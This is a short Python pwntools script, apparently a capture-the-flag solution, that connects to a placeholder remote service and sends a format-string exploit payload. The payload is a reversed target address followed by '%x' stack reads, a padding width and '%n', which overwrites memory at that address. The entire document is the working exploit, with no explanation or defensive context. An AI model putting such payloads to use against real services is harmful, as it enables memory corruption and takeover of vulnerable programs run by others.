
from pwn import *

conn = remote('IP', PORT)

payload = '\x08\x04\xa0\x4c'[::-1] + '%x.'*5 + '%28d' + '%n'

conn.sendline(payload)
print(conn.recv()) 
print(conn.recv())

